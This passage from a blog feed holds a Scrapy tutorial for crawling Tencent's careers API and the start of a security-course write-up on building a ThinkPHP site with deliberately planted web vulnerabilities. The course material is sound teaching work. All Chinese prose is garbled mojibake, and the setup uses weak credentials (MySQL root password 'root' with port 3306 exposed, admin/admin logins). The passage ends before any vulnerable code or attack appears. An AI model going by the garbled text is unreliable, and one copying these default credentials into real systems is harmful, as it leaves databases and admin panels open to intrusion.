&quot;WARNING&quot;</code></p><ul><li>çˆ¬è™«è¿è¡Œ</li></ul><p>åœ¨pycharmä¸­è¿è¡Œçˆ¬è™«é¡¹ç›®ï¼Œéœ€è¦åœ¨çˆ¬è™«é¡¹ç›®æ‰€åœ¨è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªpyæ–‡ä»¶(ä¸cfgæ–‡ä»¶åŒç›®å½•)</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> cmdlinecmdline.execute(<span class="hljs-string">&quot;scrapy crawl çˆ¬è™«åå­—&quot;</span>.split())</code></pre><ul><li>å°çŸ¥è¯†</li></ul><p>å°†çˆ¬å–åˆ°æ•°æ®è¿”å›ä½¿ç”¨çš„æ—¶yieldè€Œä¸æ˜¯returnï¼Œè¿”å›ç»™pipelineï¼Œpioelineä¸­å¯ä»¥è‡ªå®šä¹‰æ–¹æ³•</p><p>ä½¿ç”¨pipelineä¹‹å‰éœ€è¦åˆ°seting.pyä¸­å¼€å¯ï¼Œå°±æ˜¯å°†æ³¨é‡Šåˆ é™¤</p><h2 id="çˆ¬å–è…¾è®¯æ‹›è˜ä¿¡æ¯çš„scrapyçˆ¬è™«"><a href="#çˆ¬å–è…¾è®¯æ‹›è˜ä¿¡æ¯çš„scrapyçˆ¬è™«" class="headerlink" title="çˆ¬å–è…¾è®¯æ‹›è˜ä¿¡æ¯çš„scrapyçˆ¬è™«"></a>çˆ¬å–è…¾è®¯æ‹›è˜ä¿¡æ¯çš„scrapyçˆ¬è™«</h2><h3 id="1-é¦–å…ˆåˆ›ä¸€ä¸ªé¡¹ç›®"><a href="#1-é¦–å…ˆåˆ›ä¸€ä¸ªé¡¹ç›®" class="headerlink" title="1.é¦–å…ˆåˆ›ä¸€ä¸ªé¡¹ç›®"></a>1.é¦–å…ˆåˆ›ä¸€ä¸ªé¡¹ç›®</h3><p>åˆ›å»ºé¡¹ç›®çš„å‘½ä»¤å¦‚ä¸‹</p><pre><code class="hljs ebnf"><span class="hljs-attribute">scrapy startproject tencent</span></code></pre><p>åœ¨è¿›å…¥é¡¹ç›®åˆ›å»ºä¸€ä¸ªçˆ¬è™«</p><pre><code class="hljs awk">scrapy genspider hr careers.tencent.com <span class="hljs-regexp">//</span> hr ä¸ºçˆ¬è™«çš„ç½‘ç«™ <span class="hljs-regexp">//</span> careers.tencent.comè¿™ä¸ªæ˜¯çˆ¬è™«å…è®¸çˆ¬å–çš„åœ°å€</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331215742791.png" alt="image-20210331215742791" style="zoom:67%;"><h3 id="2-åˆ†æç½‘é¡µç»“æ„å’Œurlç»„æˆ"><a href="#2-åˆ†æç½‘é¡µç»“æ„å’Œurlç»„æˆ" class="headerlink" title="2.åˆ†æç½‘é¡µç»“æ„å’Œurlç»„æˆ"></a>2.åˆ†æç½‘é¡µç»“æ„å’Œurlç»„æˆ</h3><p>è¿›å…¥<code>https://careers.tencent.com/search.html</code>.</p><p>è¦çˆ¬å–çš„å†…å®¹ä¸º</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331215908145.png" alt="image-20210331215908145"></p><p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°å¹¶æ²¡æœ‰ä¸Šé¢çš„å­—æ®µï¼Œåªæœ‰ä¸€äº›jsä»£ç ï¼Œè¿™å°±è¯´æ˜<code>https://careers.tencent.com/search.html</code>ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬çˆ¬è™«çš„start_urlï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥éœ€è¦åœ¨è¯¥é¡µé¢ä¸­æ‰¾åˆ°æˆ‘ä»¬çš„start_url</p><p>F12æŸ¥çœ‹å…ƒç´ ï¼Œå¹¶åˆ·æ–°ç½‘é¡µï¼Œæ£€æŸ¥networkä¸­çš„XHRï¼Œå¾ˆå®¹æ˜“çœ‹åˆ°ä¸»é¡µé¢æ˜¾ç¤ºçš„å­—æ®µï¼Œè¯´æ˜æˆ‘ä»¬çš„start_urlï¼Œåœ¨è¿™é‡Œï¼Œå†æŸ¥çœ‹headersè·å–åˆ°url</p><pre><code class="hljs sas">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199191983<span class="hljs-variable">&amp;countryId</span>=<span class="hljs-variable">&amp;cityId</span>=<span class="hljs-variable">&amp;bgIds</span>=<span class="hljs-variable">&amp;productId</span>=<span class="hljs-variable">&amp;categoryId</span>=<span class="hljs-variable">&amp;parentCategoryId</span>=<span class="hljs-variable">&amp;attrId</span>=<span class="hljs-variable">&amp;keyword</span>=<span class="hljs-variable">&amp;pageIndex</span>=1<span class="hljs-variable">&amp;pageSize</span>=10<span class="hljs-variable">&amp;language</span>=zh-cn<span class="hljs-variable">&amp;area</span>=cn</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331220441969.png" alt="image-20210331220441969"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥çœ‹urlçš„å˜åŒ–è§„åˆ™ï¼Œè®©çˆ¬è™«å®ç°è‡ªåŠ¨ç¿»é¡µï¼Œç‚¹å‡»ç¬¬äºŒé¡µå†æ¬¡æŸ¥çœ‹ä¸Šé¢çš„url</p><pre><code class="hljs sas">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617199575064<span class="hljs-variable">&amp;countryId</span>=<span class="hljs-variable">&amp;cityId</span>=<span class="hljs-variable">&amp;bgIds</span>=<span class="hljs-variable">&amp;productId</span>=<span class="hljs-variable">&amp;categoryId</span>=<span class="hljs-variable">&amp;parentCategoryId</span>=<span class="hljs-variable">&amp;attrId</span>=<span class="hljs-variable">&amp;keyword</span>=<span class="hljs-variable">&amp;pageIndex</span>=2<span class="hljs-variable">&amp;pageSize</span>=10<span class="hljs-variable">&amp;language</span>=zh-cn<span class="hljs-variable">&amp;area</span>=cn</code></pre><p>å¾ˆå®¹æ˜“å‘ç°è§„å¾‹ï¼Œå°±æ˜¯pageIndexçš„å€¼å‘ç”Ÿäº†å˜åŒ–</p><p>æ¥ä¸‹æ¥å°±æ˜¯å·¥ä½œçš„è¯¦æƒ…é¡µçš„url</p><p>è¿›å…¥å·¥ä½œè¯¦æƒ…é¡µï¼ŒæŸ¥çœ‹æºç ä¾ç„¶åªæœ‰jsï¼Œæ‰€ä»¥ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•æŸ¥çœ‹urlå’Œå†…å®¹</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>careers.tencent.com<span class="hljs-regexp">/tencentcareer/</span>api<span class="hljs-regexp">/post/</span>ByPostId?timestamp=<span class="hljs-number">1617199879005</span>&amp;postId=<span class="hljs-number">1377253503910551552</span>&amp;language=zh-cn</code></pre><p>å…¶ä¸­æ”¹å˜çš„å‚æ•°æ˜¯<code>postId</code>ï¼Œä¸priviewä¸­çš„å€¼å¯¹åº”</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210331221442816.png" alt="image-20210331221442816"></p><h3 id="3-ç¼–å†™çˆ¬è™«"><a href="#3-ç¼–å†™çˆ¬è™«" class="headerlink" title="3.ç¼–å†™çˆ¬è™«"></a>3.ç¼–å†™çˆ¬è™«</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<span class="hljs-keyword">import</span> json<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=1&amp;pageSize=10&amp;language=zh-cn&amp;area=cn</span><span class="hljs-string"></span><span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=1123175628615454720&amp;language=zh-cn</span><span class="hljs-string"></span><span class="hljs-string">https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617181122812&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=2&amp;pageSize=10&amp;language=zh-cn&amp;area=cn</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HrSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>    name = <span class="hljs-string">&#x27;hr&#x27;</span>    allowed_domains = [<span class="hljs-string">&#x27;careers.tencent.com&#x27;</span>]    <span class="hljs-comment"># start_urls = [&#x27;http://careers.tencent.com/&#x27;]</span>    first_url = <span class="hljs-string">&quot;https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1617180957390&amp;countryId=&amp;cityId=&amp;bgIds=&amp;productId=&amp;categoryId=&amp;parentCategoryId=&amp;attrId=&amp;keyword=&amp;pageIndex=&#123;&#125;&amp;pageSize=10&amp;language=zh-cn&amp;area=cn&quot;</span>    <span class="hljs-comment"># firsturlçš„pageindexæ”¹å˜</span>    <span class="hljs-comment"># èŒä½è¯¦æƒ…é¡µçš„url</span>    detial_url = <span class="hljs-string">&quot;https://careers.tencent.com/tencentcareer/api/post/ByPostId?timestamp=1617181089850&amp;postId=&#123;&#125;&amp;language=zh-cn&quot;</span>    start_urls = [first_url.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>        <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>):            url = self.first_url.<span class="hljs-built_in">format</span>(page)            <span class="hljs-comment"># å°†urlå‘é€ç»™parse_oneç»§ç»­å¤„ç†</span>            <span class="hljs-comment"># è¿™é‡Œä¹Ÿæ˜¯åˆ†å¸ƒå¼çˆ¬è™«ä¸æ™®é€šçˆ¬è™«çš„æœ€å¤§çš„åœ°æ–¹</span>            <span class="hljs-keyword">yield</span> scrapy.Request(                url=url,                callback=self.parse_one            )    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_one</span>(<span class="hljs-params">self, response</span>):</span>        <span class="hljs-comment"># å°†ç½‘é¡µçš„æ•°æ®jsonæ ¼å¼åŒ–ï¼Œæ–¹ä¾¿è·å–æ•°æ®</span>        data = json.loads(response.text)        <span class="hljs-comment"># print(data)</span>        <span class="hljs-keyword">for</span> job <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Posts&#x27;</span>]:            item = &#123;&#125;            <span class="hljs-comment"># è·å–jsonæ ¼å¼ä¸­çš„æ•°æ®</span>            item[<span class="hljs-string">&#x27;job_name&#x27;</span>] = job[<span class="hljs-string">&#x27;RecruitPostName&#x27;</span>]            item[<span class="hljs-string">&#x27;job_type&#x27;</span>] = job[<span class="hljs-string">&#x27;CategoryName&#x27;</span>]            postid = job[<span class="hljs-string">&#x27;PostId&#x27;</span>]            detial_url = self.detial_url.<span class="hljs-built_in">format</span>(postid)            <span class="hljs-comment"># å°†è¯¦æƒ…ä¹Ÿçš„urläº¤ç»™å¦å¤–ä¸€ä¸ªparse_twoå¤„ç†</span>                      <span class="hljs-keyword">yield</span> scrapy.Request(                url=detial_url,                meta=&#123;<span class="hljs-string">&#x27;item&#x27;</span>: item&#125;, <span class="hljs-comment">#è¿™é‡Œä¸‹é¢ä¼šæœ‰è§£é‡Š &#x27;item&#x27;å¯ä»¥ä»»æ„å–å itemåˆ™æ˜¯ä¸Šé¢çš„item=&#123;&#125;</span>                callback=self.parse_two            )    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_two</span>(<span class="hljs-params">self, response</span>):</span>        item = response.meta.get(<span class="hljs-string">&#x27;item&#x27;</span>) <span class="hljs-comment"># è¿™é‡Œæ˜¯ä¸Šé¢çš„&#x27;item&#x27;</span>        data = json.loads(response.text)        <span class="hljs-comment"># print(data)</span>        item[<span class="hljs-string">&#x27;job_duty&#x27;</span>] = data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Responsibility&#x27;</span>]        item[<span class="hljs-string">&#x27;job_require&#x27;</span>] = data[<span class="hljs-string">&#x27;Data&#x27;</span>][<span class="hljs-string">&#x27;Requirement&#x27;</span>]        <span class="hljs-keyword">yield</span> item</code></pre><p>requestç±»</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Request</span>(<span class="hljs-params">object_ref</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, url, callback=<span class="hljs-literal">None</span>, method=<span class="hljs-string">&#x27;GET&#x27;</span>, headers=<span class="hljs-literal">None</span>, body=<span class="hljs-literal">None</span>,</span></span><span class="hljs-function"><span class="hljs-params">                 cookies=<span class="hljs-literal">None</span>, meta=<span class="hljs-literal">None</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, priority=<span class="hljs-number">0</span>,</span></span><span class="hljs-function"><span class="hljs-params">                 dont_filter=<span class="hljs-literal">False</span>, errback=<span class="hljs-literal">None</span>, flags=<span class="hljs-literal">None</span>, cb_kwargs=<span class="hljs-literal">None</span></span>):</span>        self._encoding = encoding  <span class="hljs-comment"># this one has to be set first</span>        self.method = <span class="hljs-built_in">str</span>(method).upper()        self._set_url(url)        self._set_body(body)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(priority, <span class="hljs-built_in">int</span>):            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&quot;Request priority not an integer: <span class="hljs-subst">&#123;priority!r&#125;</span>&quot;</span>)        self.priority = priority        <span class="hljs-keyword">if</span> callback <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">callable</span>(callback):            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&#x27;callback must be a callable, got <span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>(callback).__name__&#125;</span>&#x27;</span>)        <span class="hljs-keyword">if</span> errback <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">callable</span>(errback):            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">f&#x27;errback must be a callable, got <span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>(errback).__name__&#125;</span>&#x27;</span>)        self.callback = callback        self.errback = errback        self.cookies = cookies <span class="hljs-keyword">or</span> &#123;&#125;        self.headers = Headers(headers <span class="hljs-keyword">or</span> &#123;&#125;, encoding=encoding)        self.dont_filter = dont_filter        self._meta = <span class="hljs-built_in">dict</span>(meta) <span class="hljs-keyword">if</span> meta <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>        self._cb_kwargs = <span class="hljs-built_in">dict</span>(cb_kwargs) <span class="hljs-keyword">if</span> cb_kwargs <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>        self.flags = [] <span class="hljs-keyword">if</span> flags <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">list</span>(flags)</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­çš„å‚æ•°å¾ˆå¤šï¼Œå¸¸ç”¨çš„æ˜¯<code>url,cookie,meta</code></p><p>å…¶ä¸­metaä¸ºå­—å…¸ç±»å‹</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>spider</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mycms</title>
    <link href="/2021/03/21/mycms/"/>
    <url>/2021/03/21/mycms/</url>
    
    <content type="html"><![CDATA[<p>ç½‘ç»œå®‰å…¨ä¸æ”»å‡»å®éªŒè¯¾ç¨‹ä½œä¸š</p><span id="more"></span><p>[TOC]</p><h1 id="è¯¾ç¨‹è¦æ±‚"><a href="#è¯¾ç¨‹è¦æ±‚" class="headerlink" title="è¯¾ç¨‹è¦æ±‚"></a>è¯¾ç¨‹è¦æ±‚</h1><p>åŸºäº Linux æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Ubuntuï¼‰ï¼Œä½¿ç”¨ Docker å®¹å™¨ï¼Œé€‰æ‹©ä¸€é—¨è‡ªå·±æ“…é•¿çš„è¯­è¨€ï¼ˆåªèƒ½ä» PHPã€JAVAã€Python ä¸­é€‰æ‹©ï¼‰åŠå…¶å½“å‰æµè¡Œçš„å¼€å‘æ¡†æ¶ï¼ˆå¦‚ Java çš„ Struts2ã€Springã€Hibernateï¼ŒPythonçš„ Djangoã€flaskï¼ŒPHP çš„ ThinkPHP ç­‰ï¼‰ å¼€å‘ä¸€ä¸ª Web åº”ç”¨ç³»ç»Ÿã€‚</p><p>å…·ä½“è¦æ±‚ï¼š</p><blockquote><p>1ï¼‰è¯¥ç³»ç»Ÿéœ€å†…ç½®å…¸å‹çš„ Web æ¼æ´ï¼ˆä¸å°‘äº 10 ç§ï¼Œæ¯ç§å¯æœ‰å¤šä¸ªï¼‰ã€‚å¿…é¡»åŒ…å« SQL æ³¨å…¥ã€XSSã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œã€XXEå’Œååºåˆ—åŒ–ã€‚ </p><p>2ï¼‰åŸºäº Docker å®¹å™¨å‘å¸ƒç³»ç»Ÿï¼Œå¹¶å®Œæˆå†…ç½®å…¸å‹æ¼æ´çš„æ”»å‡»è¿‡ç¨‹ã€‚</p><p>3ï¼‰å°†åŸæœ‰æ¼æ´é¡µé¢è¿›è¡Œå®Œå–„ï¼ˆä¸èƒ½ç›´æ¥åœ¨åŸæœ‰æ¼æ´é¡µé¢ä¿®æ”¹ï¼Œéœ€é‡æ–°åˆ›å»ºä¿®å¤æ¼æ´çš„é¡µé¢ï¼‰ä»¥ä¿®å¤æ‰€æœ‰æ¼æ´ï¼Œå¹¶é€šè¿‡æµ‹è¯•è¯æ˜æ¼</p><p>æ´å·²ç»ä¿®å¤ã€‚</p></blockquote><h1 id="ç½‘ç«™å¼€å‘"><a href="#ç½‘ç«™å¼€å‘" class="headerlink" title="ç½‘ç«™å¼€å‘"></a>ç½‘ç«™å¼€å‘</h1><h2 id="1-å¼€å‘å·¥å…·"><a href="#1-å¼€å‘å·¥å…·" class="headerlink" title="1.å¼€å‘å·¥å…·"></a>1.å¼€å‘å·¥å…·</h2><p>phpstorm+vscode</p><p>phpstorm é‡è¦ç”¨äºå¯¹phpä»£ç çš„ä»£ç ç¼–å†™å’Œä¿®æ”¹ï¼Œå…¶æä¾›äº†ååˆ†ä¸°å¯Œçš„åŠŸèƒ½ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿä¿®æ”¹ä»£ç ï¼Œæä¾›ä»£ç å®šä½ï¼Œèƒ½å¤Ÿå¿«é€Ÿçš„å®šä½åˆ°æŸä¸ªå‡½æ•°æ‰€å±æ–‡ä»¶ï¼Œå¤§å¤§æé«˜äº†å·¥ä½œæ•ˆç‡ã€‚</p><p>è€Œvscodeåˆ™è´Ÿè´£æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå…¶ç›¸å¯¹äºPHP stormæ¯”è¾ƒè½»é‡ï¼Œå ç”¨å†…å­˜å°ï¼Œé€Ÿåº¦å¿«ã€‚</p><h2 id="2-ç¯å¢ƒæ­å»º"><a href="#2-ç¯å¢ƒæ­å»º" class="headerlink" title="2.ç¯å¢ƒæ­å»º"></a>2.ç¯å¢ƒæ­å»º</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>ä½¿ç”¨dockerä»¥åŠdocker-compose</p><p>å…·ä½“ä¸ºmysql 5.6 + nginx +php7.1</p><p>å…¶ä¸­docker-compose.yml</p><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">nginx:</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/nginx:latest</span>   <span class="hljs-comment"># ä¸‹è½½é•œåƒçš„æºï¼Œè¿™é‡Œé€‰æ‹©ç½‘æ˜“çš„é•œåƒæºï¼Œå¯ä»¥æé«˜ä¸‹è½½çš„é€Ÿåº¦ï¼Œ latestæ˜¯æœ€æ–°ç‰ˆæœ¬</span>    <span class="hljs-attr">ports:</span>       <span class="hljs-bullet">-</span> <span class="hljs-number">80</span><span class="hljs-string">:80</span>     <span class="hljs-comment"># ç«¯å£æ˜ å°„</span>      <span class="hljs-bullet">-</span> <span class="hljs-number">443</span><span class="hljs-string">:443</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/nginx.conf:/etc/nginx/nginx.conf</span>      <span class="hljs-comment">#nginxçš„é…ç½®æ–‡ä»¶è·¯å¾„</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/conf.d:/etc/nginx/conf.d</span>     <span class="hljs-comment"># å…¶ä»–çš„é…ç½®æ–‡ä»¶</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>      <span class="hljs-comment">#ç›®å½•æ˜ å°„  srcä½œä¸ºç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç½‘ç«™çš„æ‰€æœ‰æ–‡ä»¶éœ€è¦æ”¾åœ¨è¿™é‡Œ</span>  <span class="hljs-attr">php:</span>    <span class="hljs-attr">build:</span> <span class="hljs-string">./php</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>      <span class="hljs-comment">#æ ¹ç›®å½•</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php.ini:/usr/local/etc/php/php.ini</span>      <span class="hljs-comment"># phpçš„é…ç½®æ–‡ä»¶</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf</span>   <span class="hljs-attr">mysql:</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/mysql:5.6</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/data:/var/lib/mysql</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/my.cnf:/etc/mysql/conf.d/my.cnf</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/init:/docker-entrypoint-initdb.d/</span>      <span class="hljs-comment"># è¿™é‡Œéœ€è¦åˆå§‹åŒ–ä¸€ä¸ªæ•°æ®åº“</span>    <span class="hljs-attr">ports:</span>       <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=root</span>     <span class="hljs-comment"># mysqlæ•°æ®åº“çš„å¯†ç </span></code></pre><p>å…¶ä½™é…ç½®æ–‡ä»¶å¯ä»¥æ ¹æ®éœ€è¦ä»ç½‘ä¸Šè·å–ã€‚</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>æ­å»ºç›®çš„æ˜¯æµ‹è¯•ä½¿ç”¨ï¼Œæ–¹ä¾¿é‡æ–°æ­å»ºå’Œæ•°æ®ç®¡ç†ï¼Œä¸ºå†linuxä¸Šæ­å»ºåšå¥½å‡†å¤‡</p><p>è¯¾ç¨‹è¦æ±‚ä½¿ç”¨dockeræ­å»ºè¿è¡Œç¯å¢ƒï¼Œä½†æ˜¯Linuxç³»ç»Ÿæ˜¯è™šæ‹Ÿæœºæ­å»ºçš„ï¼Œé‡Œé¢æ²¡æœ‰å¥½ç”¨çš„phpStromï¼Œæ‰€ä»¥å…ˆåœ¨windowsä¸Šæ­å»ºï¼Œè¯•è¯•æ°´ã€‚</p><p>å·¥å…·ä½¿ç”¨phpstduy2018ï¼Œapache+php7.1</p><ul><li><p>é¦–å…ˆåœ¨æ•°æ®åº“ä¸­å»ºç«‹ä¸€ä¸ªæ•°æ®åº“ï¼Œå¤åˆ¶cms.sqlä¸­çš„å†…å®¹åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</p></li><li><p>å°†æ–‡ä»¶æ”¾å…¥wwwç›®å½•ä¸‹ï¼Œä¿®æ”¹configä¸­çš„database.phpå†…å®¹ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç è¯¥å¯¹åº”çš„å†…å®¹</p></li><li><p>æ‰“å¼€phpstduy,é€‰æ‹© å…¶ä»–èœå•é€‰é¡¹-&gt;ç«™ç‚¹åŸŸåç®¡ç†ï¼Œç½‘ç«™ç›®å½•é€‰æ‹©cms/publicï¼Œç½‘ç«™åéšä¾¿èµ·ï¼Œå¦‚<a href="http://www.mycms.com">www.mycms.com</a></p></li><li><p>æ‰“å¼€hostæ–‡ä»¶ï¼Œæ·»åŠ  <code>127.0.0.1  www.mycms.com</code>ï¼Œç„¶åè®¿é—®å³å¯<a href="http://www.mycms.com/adminè¿›å…¥åå°">www.mycms.com/adminè¿›å…¥åå°</a></p><p>è´¦å·å¯†ç éƒ½ä¸ºadmin</p></li></ul>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321160739254.png" style="zoom:50%;"><h2 id="3-å¼€å‘è¿‡ç¨‹"><a href="#3-å¼€å‘è¿‡ç¨‹" class="headerlink" title="3.å¼€å‘è¿‡ç¨‹"></a>3.å¼€å‘è¿‡ç¨‹</h2><p>å¼€å‘thinkphpçš„ç½‘ç«™ï¼Œå½“ç„¶ç¦»ä¸å¼€ThinkPHPçš„æ‰‹å†Œ<code>http://www.shouce.ren/api/view/a/15517</code></p><p>thinkphpä¸­æ˜¯åŸºäº<code>æ¨¡å—\æ§åˆ¶å™¨\æ–¹æ³•</code>æ¥è®¿é—®ç½‘é¡µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å­¦ä¼šå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨</p><p>åœ¨ç½‘ç«™çš„æ–‡ä»¶ä¸‹ï¼Œè°ƒå‡ºç»ˆç«¯ä½¿ç”¨</p><pre><code class="hljs gauss">php think <span class="hljs-built_in">make</span>:controller  æ¨¡å—å\æ§åˆ¶å™¨å</code></pre><p>åˆ›å»ºå®Œåä¾¿å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥<code>127.0.0.1\æ¨¡å—å\æ§åˆ¶å™¨å</code>ï¼Œè¿›è¡Œè®¿é—®ï¼Œå½“ç„¶è¿˜è¦ç»§ç»­å®Œå–„å…¶ä¸­çš„å†…å®¹</p><p>ä»¥ä¸Šæ˜¯å¼€å‘æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œæ‰€æœ‰çš„æ¼æ´ä»£ç åŸºæœ¬éƒ½éœ€è¦åœ¨è‡ªå·±æ‰€åˆ›å»ºçš„æ§åˆ¶å™¨ä¸­å®Œæˆçš„ã€‚</p><h2 id="4-ç½‘ç«™ä»‹ç»"><a href="#4-ç½‘ç«™ä»‹ç»" class="headerlink" title="4.ç½‘ç«™ä»‹ç»"></a>4.ç½‘ç«™ä»‹ç»</h2><p>æ­¤ç«™ç‚¹é‡‡ç”¨çš„æ˜¯åŸºäºthinkPHPçš„cmsï¼Œæ­¤cmsåŒ…å«å¸¸ç”¨äºä¸€äº›å…¬å¸ä¸»é¡µä»‹ç»æˆ–è€…ä¸ªäººåšå®¢çš„æ­å»ºï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ç›¸å¯¹æ¯”è¾ƒé½å…¨çš„cmsï¼Œä½†æ˜¯éšç€åŠŸèƒ½çš„å¢å¤šä¹Ÿä¼šæš´éœ²å‡ºä¸€äº›é—®é¢˜ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ä¸€äº›æ¼æ´ï¼ŒåŠ ä¸Šè‡ªå·±æ ¹æ®è¯¾ç¨‹è¦æ±‚å¯¹å…¶è¿›è¡Œäº†é­”æ”¹ï¼Œä½¿å¾—è¯¥ç³»ç»ŸåŒ…å«äº†åäºŒç§æ¼æ´ï¼ŒäºŒåä¸ªæ¼æ´ç‚¹ã€‚</p><p>è¯¥ç½‘ç«™æ˜¯ä¸€å®¶å®‰å…¨å…¬å¸çš„ä¸»é¡µï¼Œä½†æ˜¯ç”±äºè¯¥å®‰å…¨å…¬å¸åˆšåˆšæˆç«‹ä¸ä¹…ï¼Œç½‘ç«™å¼€å‘äººå‘˜å®‰å…¨æ„è¯†ä¸å¤Ÿé«˜ï¼ˆhaha, 